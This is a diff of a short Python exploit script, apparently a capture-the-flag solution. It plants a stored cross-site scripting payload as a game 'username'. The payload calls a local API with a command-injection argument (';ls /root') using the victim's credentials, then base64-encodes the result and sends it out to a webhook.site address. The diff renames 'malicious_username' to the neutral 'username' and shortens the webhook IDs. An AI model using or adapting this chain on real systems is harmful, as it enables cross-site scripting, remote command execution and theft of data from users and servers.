@@ -1,23 +1,23 @@
 import requests
 
-malicious_username = (
+username = (
     '<script>'
     'fetch("http://127.0.0.1:1337/api/cal?modifier=;ls /root", {credentials: "include"})'
     '.then(response => response.text())'
     '.then(text => {'
     '  var b64data = btoa(text);'
     '  var img = new Image();'
-    '  img.src = "	https://webhook.site/f998a9cc-5d37-46c9-844b-6adcf2487512/?data=" + b64data;'
+    '  img.src = "	https://webhook.site/f99cc-5d37-46c9-842/?data=" + b64data;'
     '})'
     '.catch(error => {'
     '  var img = new Image();'
-    '  img.src = "https://webhook.site/f998a9cc-5d37-46c9-844b-6adcf2487512/?error=" + encodeURIComponent(error);'
+    '  img.src = "https://webhook.site/f998512/?error=" + encodeURIComponent(error);'
     '});'
     '</script>'
 )
 
 data = {
-    "username": malicious_username,
+    "username": username,
     "high_score": 100
 }
 
